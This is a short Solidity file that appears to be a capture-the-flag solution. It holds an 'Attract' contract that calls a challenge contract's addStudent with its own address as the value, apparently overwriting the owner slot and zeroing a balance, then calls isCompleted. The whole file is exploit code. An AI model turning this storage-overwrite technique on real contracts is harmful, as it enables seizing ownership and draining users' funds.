pragma solidity ^0.4.24;
//1.owner.2.余额归零
import "./1.sol";
contract Attract{
    Struct struct1;
    constructor(Struct addr)public {
        struct1 = addr;
    }
    function attract() public  {
        struct1.addStudent(uint256(address(this)), 1000000000000000000);
        struct1.isCompleted();
    }
    
}